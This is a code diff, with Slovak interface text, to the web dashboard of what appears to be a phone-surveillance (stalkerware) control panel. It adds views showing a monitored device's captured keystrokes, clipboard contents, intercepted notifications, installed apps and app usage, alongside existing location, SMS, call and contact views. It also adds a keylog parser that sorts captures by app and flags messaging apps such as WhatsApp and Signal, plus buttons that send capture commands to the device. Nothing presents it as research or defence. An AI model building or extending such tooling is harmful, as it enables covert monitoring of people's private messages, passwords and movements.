@@ -198,6 +198,49 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
 /* The native audio widget is a white blob - keep it slim and in the theme. */
 .gitem audio{width:100%;height:36px;filter:invert(.92) hue-rotate(180deg) saturate(.6)}
 #fileRows audio{filter:invert(.92) hue-rotate(180deg) saturate(.6)}
+
+/* ---- upravené: filtre, pod-karty, karty aplikácií ---- */
+.subtabs{display:flex;gap:6px;flex-wrap:wrap;padding:0 16px 12px}
+.subtabs button{
+  background:var(--panel3);border:1px solid var(--line2);color:var(--mut);border-radius:20px;
+  padding:6px 13px;font-size:12px;font-weight:600;cursor:pointer;transition:.15s;
+}
+.subtabs button:hover{color:var(--txt);border-color:var(--acc)}
+.subtabs button.on{background:rgba(79,124,255,.18);color:#cfe0ff;border-color:rgba(79,124,255,.45)}
+.appgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:10px;padding:14px}
+.appcard{
+  border:1px solid var(--line);border-radius:12px;background:#0b1220;padding:12px 13px;cursor:pointer;transition:.15s;
+}
+.appcard:hover{border-color:var(--acc);transform:translateY(-1px)}
+.appcard.on{border-color:var(--acc);background:rgba(79,124,255,.1)}
+.appcard .nm{font-size:13.5px;font-weight:700;display:flex;align-items:center;gap:6px}
+.appcard .pk{font-size:10.5px;color:var(--dim);font-family:ui-monospace,Menlo,monospace;margin-top:3px;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.appcard .ct{display:flex;gap:6px;margin-top:9px;flex-wrap:wrap}
+.dotapp{width:7px;height:7px;border-radius:50%;display:inline-block}
+.socgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:10px;padding:14px}
+.soccard{
+  border:1px solid rgba(124,92,255,.35);border-radius:12px;padding:11px 12px;cursor:pointer;
+  background:linear-gradient(180deg,rgba(124,92,255,.14),rgba(124,92,255,.04));transition:.15s;
+}
+.soccard:hover{transform:translateY(-1px);border-color:#7c5cff}
+.soccard .nm{font-size:13.5px;font-weight:700}
+.soccard .ct{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+#appFilter{
+  background:#0b1220;border:1px solid var(--line2);color:var(--txt);border-radius:10px;
+  padding:8px 10px;font-size:12.5px;outline:none;max-width:230px;
+}
+#appFilter:focus{border-color:var(--acc)}
+.evtype{font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
+  padding:2px 7px;border-radius:12px;background:rgba(255,255,255,.07);color:var(--mut);white-space:nowrap}
+.evtype.TEXT{background:rgba(79,124,255,.16);color:#9dbaff}
+.evtype.CLICK{background:rgba(245,158,11,.14);color:#fcd34d}
+.evtype.VIEW{background:rgba(6,182,212,.13);color:#67e8f9}
+.evtype.NOTIF{background:rgba(124,92,255,.16);color:#c4b5fd}
+.soclabel{font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
+  color:#c4b5fd;background:rgba(124,92,255,.16);border:1px solid rgba(124,92,255,.35);
+  padding:2px 7px;border-radius:12px}
+
 .gitem .ph img{width:100%;height:100%;object-fit:cover;display:block}
 .gitem .nm{padding:7px 9px;font-size:11.5px;color:var(--mut);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .gitem .nm b{display:block;color:var(--txt);font-size:12px;font-weight:600}
@@ -304,7 +347,11 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
       <div class="grp">Monitor</div>
       <a data-view="overview"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="7" height="9" rx="2"/><rect x="14" y="3" width="7" height="5" rx="2"/><rect x="14" y="12" width="7" height="9" rx="2"/><rect x="3" y="16" width="7" height="5" rx="2"/></svg>Prehľad</a>
       <a data-view="location"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 21s7-6.2 7-11a7 7 0 1 0-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.6"/></svg>Poloha</a>
-      <a data-view="keylog"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M6 9h.01M10 9h.01M14 9h.01M18 9h.01M7 13h.01M11 13h.01M15 13h.01M7 16h10"/></svg>Keylog</a>
+      <a data-view="keylog"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M6 9h.01M10 9h.01M14 9h.01M18 9h.01M7 13h.01M11 13h.01M15 13h.01M7 16h10"/></svg>Klávesnica</a>
+      <a data-view="clipboard"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="4" width="14" height="17" rx="2"/><path d="M9 4h6v3H9z"/><path d="M9 12h6M9 16h4"/></svg>Schránka</a>
+      <a data-view="notif"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 9a6 6 0 1 0-12 0c0 6-2 7-2 7h16s-2-1-2-7"/><path d="M10.5 20a2 2 0 0 0 3 0"/></svg>Notifikácie</a>
+      <a data-view="apps"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="2"/><rect x="14" y="3" width="7" height="7" rx="2"/><rect x="3" y="14" width="7" height="7" rx="2"/><rect x="14" y="14" width="7" height="7" rx="2"/></svg>Aplikácie</a>
+      <a data-view="usage"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 20h18"/><rect x="5" y="10" width="4" height="10" rx="1"/><rect x="11" y="5" width="4" height="15" rx="1"/><rect x="17" y="13" width="4" height="7" rx="1"/></svg>Používanie</a>
       <a data-view="messages"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H8l-5 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Správy</a>
       <a data-view="calls"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1 1 .4 1.9.7 2.8a2 2 0 0 1-.5 2.1L8.1 9.9a16 16 0 0 0 6 6l1.3-1.2a2 2 0 0 1 2.1-.5c.9.3 1.8.6 2.8.7a2 2 0 0 1 1.7 2z"/></svg>Hovory</a>
       <a data-view="contacts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.9"/></svg>Kontakty</a>
@@ -343,6 +390,7 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
         <input id="globalSearch" placeholder="Hľadať v udalostiach…">
       </div>
+      <select id="appFilter" title="Filter aplikácie"><option value="">Všetky aplikácie</option></select>
       <span class="pill" id="livePill"><span class="dot"></span> offline</span>
       <button class="btn" id="wizBtn" title="Otvoriť nastavenie na zariadení" style="display:none">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 6h16M4 12h10M4 18h13"/><path d="m17 15 4 3-4 3z"/></svg>
@@ -429,9 +477,66 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
               <option value="text">text</option>
             </select>
           </div>
+          <div class="subtabs" id="keyTabs">
+            <button data-t="" class="on">Všetko</button>
+            <button data-t="TEXT">Písané texty</button>
+            <button data-t="VIEW">Zobrazené texty</button>
+            <button data-t="CLICK">Kliknutia</button>
+            <button data-t="NOTIF">Notifikácie</button>
+          </div>
           <div class="scroll"><table>
-            <thead><tr><th style="width:150px">Čas</th><th style="width:190px">Aplikácia</th><th>Obsah</th></tr></thead>
+            <thead><tr><th style="width:150px">Čas</th><th style="width:200px">Aplikácia</th><th style="width:90px">Typ</th><th>Obsah</th></tr></thead>
             <tbody id="keyRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- CLIPBOARD -->
+      <section class="view" id="v-clipboard">
+        <div class="card">
+          <h3>Schránka<span class="hint" id="clipHint"></span></h3>
+          <div class="searchbar">
+            <input id="clipSearch" placeholder="Hľadať v schránke…">
+            <button class="btn" onclick="runCmd('clipboard')">Prečítať schránku</button>
+          </div>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:160px">Čas</th><th style="width:190px">Aplikácia</th><th>Obsah schránky</th></tr></thead>
+            <tbody id="clipRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- NOTIFICATIONS -->
+      <section class="view" id="v-notif">
+        <div class="card">
+          <h3>Notifikácie zachytené zo zariadenia<span class="hint" id="notifHint"></span></h3>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:160px">Čas</th><th style="width:210px">Aplikácia</th><th style="width:210px">Nadpis</th><th>Obsah</th></tr></thead>
+            <tbody id="notifRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- APPS -->
+      <section class="view" id="v-apps">
+        <div class="card" style="margin-bottom:16px">
+          <h3>Sociálne siete a aplikácie<span class="hint" id="socHint"></span></h3>
+          <div class="socgrid" id="socGrid"></div>
+        </div>
+        <div class="card">
+          <h3>Všetky zachytené aplikácie<span class="hint" id="appHint"></span></h3>
+          <div class="appgrid" id="appGrid"></div>
+        </div>
+      </section>
+
+      <!-- USAGE -->
+      <section class="view" id="v-usage">
+        <div class="card">
+          <h3>Používanie aplikácií<span class="hint" id="usageHint"></span></h3>
+          <div class="searchbar">
+            <button class="btn" onclick="runCmd('usage')">Získať štatistiky</button>
+            <button class="btn" onclick="runCmd('apps')">Zoznam aplikácií</button>
+          </div>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:280px">Aplikácia</th><th style="width:170px">Balík</th><th>Čas používania</th></tr></thead>
+            <tbody id="usageRows"></tbody></table></div>
         </div>
       </section>
 
@@ -520,7 +625,8 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
 
 <script src="/static/leaflet/leaflet.js"></script>
 <script>
-const S = {device:null, view:'overview', devices:[], map:null, mini:null, track:null, q:''};
+const S = {device:null, view:'overview', devices:[], map:null, mini:null, track:null, q:'',
+  app:localStorage.getItem('sp_app')||'', keyType:'', pkgs:new Map(), social:new Map()};
 const $ = id => document.getElementById(id);
 const esc = s => (s==null?'':String(s)).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 const fmtT = ts => ts ? new Date(ts).toLocaleString('sv-SE',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit'}) : '—';
@@ -587,6 +693,72 @@ function pickText(o, keys){
   return '';
 }
 
+/* ---------- applications & social networks ---------- */
+const SOCIAL={
+  'com.facebook.kaia':'Facebook','com.facebook.orca':'Messenger','com.facebook.appmanager':'Facebook',
+  'com.facebook.system':'Facebook','com.facebook.services':'Facebook','com.facebook.lite':'Facebook Lite',
+  'com.instagram.android':'Instagram','com.whatsapp':'WhatsApp','com.whatsapp.w4b':'WhatsApp Business',
+  'org.telegram.messenger':'Telegram','com.zhiliaoapp.musically':'TikTok','com.snapchat.android':'Snapchat',
+  'com.twitter.android':'X (Twitter)','com.linkedin.android':'LinkedIn','com.discord':'Discord',
+  'org.thoughtcrime.securesms':'Signal','com.reddit.frontpage':'Reddit','com.viber.voip':'Viber',
+  'com.spotify.music':'Spotify','com.google.android.gm':'Gmail','com.microsoft.teams':'MS Teams',
+  'com.skype.raider':'Skype','com.zoom.us':'Zoom','com.google.android.youtube':'YouTube',
+  'com.truecaller':'Truecaller','com.kakao.talk':'KakaoTalk','com.wechat':'WeChat',
+  'com.pinterest':'Pinterest','com.tumblr':'Tumblr','com.threads':'Threads'
+};
+const PKG_LABEL={};          /* label learned from the device (usage / apps report) */
+function appLabel(pkg){
+  if(!pkg) return '—';
+  if(PKG_LABEL[pkg]) return PKG_LABEL[pkg];
+  if(SOCIAL[pkg]) return SOCIAL[pkg];
+  const tail=(pkg.split('.').pop()||pkg);
+  return tail.charAt(0).toUpperCase()+tail.slice(1);
+}
+function isSocial(pkg){ return !!SOCIAL[pkg]; }
+function learnLabel(pkg,label){
+  if(pkg && label && !PKG_LABEL[pkg]) PKG_LABEL[pkg]=label;
+}
+function notePkg(pkg,label,count,ts){
+  if(!pkg) return;
+  learnLabel(pkg,label);
+  const e=S.pkgs.get(pkg)||{pkg,label:appLabel(pkg),count:0,last:0,social:isSocial(pkg)};
+  if(label) e.label=label;
+  e.count+=count||1;
+  if(ts && ts>e.last) e.last=ts;
+  e.social=e.social||isSocial(pkg);
+  S.pkgs.set(pkg,e);
+  if(e.social) S.social.set(pkg,e);
+}
+function setAppFilter(pkg){
+  S.app = (S.app===pkg) ? '' : pkg;
+  localStorage.setItem('sp_app', S.app||'');
+  const sel=$('appFilter'); if(sel) sel.value=S.app;
+  refreshAppFilter();
+  const f=LOADERS[S.view]; if(f) f();
+}
+function refreshAppFilter(){
+  const sel=$('appFilter'); if(!sel) return;
+  const cur=S.app;
+  const pkgs=[...S.pkgs.values()].sort((a,b)=>b.count-a.count);
+  sel.innerHTML='<option value="">Všetky aplikácie</option>'+pkgs.map(p=>
+    `<option value="${esc(p.pkg)}">${esc(p.label)} — ${esc(p.pkg)}</option>`).join('');
+  sel.value=cur;
+}
+function parseKeylog(payload){
+  const out=[];
+  if(!payload) return out;
+  const re=/^\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s*\[([^\]]+)\]\s*([A-Z]+)\s*:\s*([\s\S]*)$/;
+  for(const raw of String(payload).split('\n')){
+    const line=raw.trim();
+    if(!line) continue;
+    const m=line.match(re);
+    if(m) out.push({ts:m[1], pkg:m[2], type:m[3], text:m[4].trim()});
+    else out.push({ts:null, pkg:'', type:'TEXT', text:line});
+  }
+  return out;
+}
+function eventTime(e, raw){ return e.ts ? e.ts : fmtT(raw); }
+
 /* ---------- devices ---------- */
 async function loadDevices(){
   S.devices = await j('/api/devices') || [];
@@ -636,6 +808,13 @@ async function loadOverview(){
   pill.className = 'pill ' + (online?'live':'off');
   pill.innerHTML = `<span class="dot ${online?'on':'off'}"></span> ${online?'online':'offline'}`;
 
+  const logs = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=200')||[];
+  const socialSeen=new Set();
+  for(const l of logs){
+    if(l.kind==='keylog'){ for(const e of parseKeylog(l.payload)) if(isSocial(e.pkg)) socialSeen.add(e.pkg); }
+    else { const o=parsePayload(l.payload); if(o&&o.pkg&&isSocial(o.pkg)) socialSeen.add(o.pkg); }
+  }
+
   const events = Object.entries(c).sort((a,b)=>b[1]-a[1]);
   const total = events.reduce((s,[,n])=>s+n,0);
   const keylog = (c.keylog||0)+(c.clipboard||0);
@@ -645,6 +824,8 @@ async function loadOverview(){
       <div class="s">${fmtAgo(dev.last_seen)}</div></div>
     <div class="card tile" data-go="keylog"><div class="k">${icon('keylog')} Keylog / clipboard</div>
       <div class="v">${keylog}</div><div class="s">zachytených záznamov</div></div>
+    <div class="card tile" data-go="apps"><div class="k">${icon('default')} Sociálne siete</div>
+      <div class="v">${(c.notification||0)}</div><div class="s">notifikácií · ${socialSeen.size} sietí</div></div>
     <div class="card tile" data-go="media"><div class="k">${icon('media')} Súbory</div>
       <div class="v">${d.files||0}</div><div class="s">stiahnutých súborov</div></div>
     <div class="card tile" data-go="commands"><div class="k">${icon('default')} Udalosti</div>
@@ -656,7 +837,6 @@ async function loadOverview(){
       </div>`;
   $('tiles').querySelectorAll('.tile').forEach(t=>t.addEventListener('click',()=>go(t.dataset.go)));
 
-  const logs = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=18')||[];
   $('tlHint').textContent = logs.length+' záznamov';
   $('timeline').innerHTML = logs.length ? logs.map((l,i)=>{
     const o=parsePayload(l.payload);
@@ -809,16 +989,136 @@ function drawMini(loc){
 /* ---------- log tabs ---------- */
 async function loadKeylog(){
   if(!S.device) return;
-  const q=$('keySearch').value.trim(), kind=$('keyKind').value;
-  const rows = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=300'+qs({q,kind}))||[];
-  const filt = (kind || q) ? rows : rows.filter(r=>/keylog|clipboard|text|key|notification/i.test(r.kind));
-  $('keyHint').textContent = filt.length+' záznamov';
-  $('keyRows').innerHTML = filt.length ? filt.map(r=>{
+  const q=$('keySearch').value.trim().toLowerCase();
+  const kind=$('keyKind').value;
+  const rows = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=500'+qs({q,kind}))||[];
+  const wanted = kind ? rows : rows.filter(r=>/keylog|clipboard|notification|text/i.test(r.kind));
+  const evs=[];
+  for(const r of wanted){
     const o=parsePayload(r.payload);
-    const app = pickText(o,['app','package','app_name','source']);
-    const txt = pickText(o,['text','msg','content','body','value']) || r.payload;
-    return `<tr><td class="mono">${fmtT(r.ts)}</td><td>${esc(app||'—')}</td><td>${esc(String(txt).slice(0,400))}</td></tr>`;
-  }).join('') : '<tr><td colspan="3" class="empty">Zatiaľ žiadne záznamy.</td></tr>';
+    if(r.kind==='keylog' || !o){
+      for(const e of parseKeylog(r.payload)) evs.push({...e, raw:r.ts});
+    } else {
+      const pkg=pickText(o,['pkg','app','package','app_name','source']);
+      const text=pickText(o,['text','msg','body','content','value']) || r.payload;
+      evs.push({ts:null, pkg, type:(r.kind==='notification'?'NOTIF':'TEXT'), text, raw:r.ts});
+    }
+  }
+  const q2 = S.keyType;
+  const view = evs.filter(e=>{
+    if(S.app && e.pkg!==S.app) return false;
+    if(q2 && e.type!==q2) return false;
+    if(q && !String(e.text).toLowerCase().includes(q)) return false;
+    return true;
+  }).sort((a,b)=>String(b.raw).localeCompare(String(a.raw)));
+  for(const e of view) notePkg(e.pkg, null, 1, e.raw);
+  refreshAppFilter();
+  const sub = S.keyType? ' · '+S.keyType : '';
+  $('keyHint').textContent = view.length+' záznamov'+sub+(S.app? ' · '+appLabel(S.app):'');
+  $('keyRows').innerHTML = view.length ? view.map(e=>`<tr>
+      <td class="mono">${esc(eventTime(e,e.raw))}</td>
+      <td>${e.pkg?`<span class="soclabel" style="${isSocial(e.pkg)?'':'display:none'}">sociálna</span> `:''}${esc(appLabel(e.pkg))}
+          <div style="font-size:10px;color:var(--dim);font-family:ui-monospace,Menlo,monospace">${esc(e.pkg||'')}</div></td>
+      <td><span class="evtype ${esc(e.type)}">${esc(e.type)}</span></td>
+      <td>${esc(String(e.text).slice(0,600))}</td></tr>`).join('')
+    : '<tr><td colspan="4" class="empty">Zatiaľ žiadne záznamy. Skús iný filter alebo príkaz „clipboard“.</td></tr>';
+}
+async function loadClipboard(){
+  if(!S.device) return;
+  const q=$('clipSearch').value.trim().toLowerCase();
+  const rows=await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&kind=clipboard&limit=200')||[];
+  const items=rows.map(r=>{
+    const o=parsePayload(r.payload)||{};
+    return {ts:o.ts||r.ts, text:o.text||r.payload, pkg:o.pkg||'', label:o.label||''};
+  }).filter(x=>!q || String(x.text).toLowerCase().includes(q)).sort((a,b)=>String(b.ts).localeCompare(String(a.ts)));
+  for(const it of items) notePkg(it.pkg, it.label||null, 1, it.ts);
+  refreshAppFilter();
+  $('clipHint').textContent = items.length+' záznamov';
+  $('clipRows').innerHTML = items.length ? items.map(it=>`<tr>
+      <td class="mono">${esc(fmtT(it.ts))}</td>
+      <td>${esc(it.pkg?appLabel(it.pkg):'—')}</td>
+      <td>${esc(String(it.text).slice(0,600))}</td></tr>`).join('')
+    : '<tr><td colspan="3" class="empty">Schránka je prázdna. Pošli príkaz „clipboard“.</td></tr>';
+}
+async function loadNotifications(){
+  if(!S.device) return;
+  const rows=await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&kind=notification&limit=300')||[];
+  const items=rows.map(r=>{
+    const o=parsePayload(r.payload)||{};
+    return {ts:o.ts||r.ts, pkg:o.pkg||'', title:o.title||'', body:o.body||''};
+  }).filter(x=>x.body||x.title).sort((a,b)=>String(b.ts).localeCompare(String(a.ts)));
+  for(const it of items) notePkg(it.pkg, null, 1, it.ts);
+  refreshAppFilter();
+  $('notifHint').textContent = items.length+' notifikácií';
+  $('notifRows').innerHTML = items.length ? items.map(it=>`<tr>
+      <td class="mono">${esc(fmtT(it.ts))}</td>
+      <td>${isSocial(it.pkg)?'<span class="soclabel">sociálna</span> ':''}${esc(appLabel(it.pkg))}
+          <div style="font-size:10px;color:var(--dim)">${esc(it.pkg)}</div></td>
+      <td>${esc(it.title)}</td><td>${esc(String(it.body).slice(0,400))}</td></tr>`).join('')
+    : '<tr><td colspan="4" class="empty">Zatiaľ žiadne notifikácie.</td></tr>';
+}
+async function loadApps(){
+  if(!S.device) return;
+  const rows=await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=500')||[];
+  for(const r of rows){
+    if(r.kind==='keylog'){ for(const e of parseKeylog(r.payload)) notePkg(e.pkg,null,1,r.ts); }
+    else {
+      const o=parsePayload(r.payload);
+      if(o && typeof o==='object'){
+        const pkg=pickText(o,['pkg','app','package']);
+        const label=pickText(o,['label','app_name','name']);
+        if(pkg) notePkg(pkg, label||null, 1, r.ts);
+        if(Array.isArray(o.apps)) for(const a of o.apps) if(a&&a.pkg) notePkg(a.pkg, a.label||null, 1, r.ts);
+        if(Array.isArray(o.items)) for(const a of o.items) if(a&&a.pkg) notePkg(a.pkg, a.label||null, 1, r.ts);
+      }
+    }
+  }
+  const all=[...S.pkgs.values()].sort((a,b)=>b.count-a.count);
+  const social=all.filter(p=>p.social);
+  const known=Object.keys(SOCIAL);
+  const seenSocial=new Set(social.map(p=>p.pkg));
+  $('socHint').textContent = seenSocial.size+' z '+known.length+' aktívnych';
+  $('socGrid').innerHTML = known.map(pkg=>{
+    const e=S.pkgs.get(pkg);
+    const on=seenSocial.has(pkg);
+    return `<div class="soccard" style="${on?'':'opacity:.45'}" onclick="setAppFilter('${esc(pkg)}')">
+      <div class="nm">${esc(SOCIAL[pkg])}</div>
+      <div style="font-size:10px;color:var(--dim);font-family:ui-monospace,Menlo,monospace">${esc(pkg)}</div>
+      <div class="ct">${on?`<span class="tag green">${e.count} záznamov</span>`:'<span class="tag">nevidí sa</span>'}</div>
+    </div>`;
+  }).join('');
+  $('appHint').textContent = all.length+' aplikácií';
+  $('appGrid').innerHTML = all.length ? all.map(p=>`<div class="appcard ${S.app===p.pkg?'on':''}" onclick="setAppFilter('${esc(p.pkg)}')">
+      <div class="nm">${p.social?'<span class="soclabel">sociálna</span>':''}${esc(p.label)}</div>
+      <div class="pk">${esc(p.pkg)}</div>
+      <div class="ct"><span class="tag">${p.count} záznamov</span>${p.last?`<span class="tag">${esc(fmtAgo(p.last))}</span>`:''}</div>
+    </div>`).join('') : '<div class="empty" style="padding:14px">Zatiaľ žiadne zachytené aplikácie.</div>';
+}
+async function loadUsage(){
+  if(!S.device) return;
+  const rows=await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&kind=usage&limit=20')||[];
+  const list=[];
+  for(const r of rows){
+    const o=parsePayload(r.payload);
+    if(!o) continue;
+    const apps=Array.isArray(o.apps)?o.apps:[];
+    for(const a of apps){
+      if(!a||!a.pkg) continue;
+      learnLabel(a.pkg,a.label);
+      list.push({pkg:a.pkg,label:a.label||appLabel(a.pkg),ms:a.ms||0});
+    }
+  }
+  list.sort((a,b)=>b.ms-a.ms);
+  const total=list.reduce((s,x)=>s+x.ms,0)||1;
+  $('usageHint').textContent = list.length+' aplikácií · '+Math.round(total/60000)+' min';
+  $('usageRows').innerHTML = list.length ? list.map(a=>{
+    const pct=Math.round(a.ms/total*100);
+    return `<tr><td>${isSocial(a.pkg)?'<span class="soclabel">sociálna</span> ':''}${esc(a.label)}
+        <div style="height:4px;background:rgba(255,255,255,.06);border-radius:3px;margin-top:6px;overflow:hidden">
+          <div style="width:${pct}%;height:100%;background:linear-gradient(90deg,#4f7cff,#7c5cff)"></div></div></td>
+      <td class="mono" style="font-size:11px;color:var(--dim)">${esc(a.pkg)}</td>
+      <td class="mono">${Math.round(a.ms/1000)} s · ${pct} %</td></tr>`;
+  }).join('') : '<tr><td colspan="3" class="empty">Zatiaľ žiadne štatistiky. Pošli príkaz „usage“.</td></tr>';
 }
 async function loadMessages(){
   if(!S.device) return;
@@ -1049,6 +1349,7 @@ function closeModal(){ $('modal').classList.remove('on'); }
 
 /* ---------- routing ---------- */
 const LOADERS = {overview:loadOverview, location:loadLocation, keylog:loadKeylog,
+  clipboard:loadClipboard, notif:loadNotifications, apps:loadApps, usage:loadUsage,
   messages:loadMessages, calls:loadCalls, contacts:loadContacts, media:loadFiles,
   files:loadFiles, commands:loadCommands};
 function go(view){
@@ -1074,6 +1375,17 @@ $('cmdSend').addEventListener('click',()=>{
 $('modal').addEventListener('click',e=>{ if(e.target.id==='modal') closeModal(); });
 $('keySearch').addEventListener('input',()=>{ clearTimeout(window._t1); window._t1=setTimeout(loadKeylog,350); });
 $('keyKind').addEventListener('change',loadKeylog);
+$('clipSearch').addEventListener('input',()=>{ clearTimeout(window._t4); window._t4=setTimeout(loadClipboard,350); });
+$('appFilter').addEventListener('change',e=>{
+  S.app=e.target.value||''; localStorage.setItem('sp_app',S.app);
+  const f=LOADERS[S.view]; if(f) f();
+});
+$('keyTabs').addEventListener('click',e=>{
+  const b=e.target.closest('button'); if(!b) return;
+  document.querySelectorAll('#keyTabs button').forEach(x=>x.classList.toggle('on',x===b));
+  S.keyType=b.dataset.t||'';
+  loadKeylog();
+});
 $('smsSearch').addEventListener('input',()=>{ clearTimeout(window._t2); window._t2=setTimeout(loadMessages,350); });
 $('contactSearch').addEventListener('input',()=>{ clearTimeout(window._t3); window._t3=setTimeout(loadContacts,350); });
 $('globalSearch').addEventListener('input',e=>{
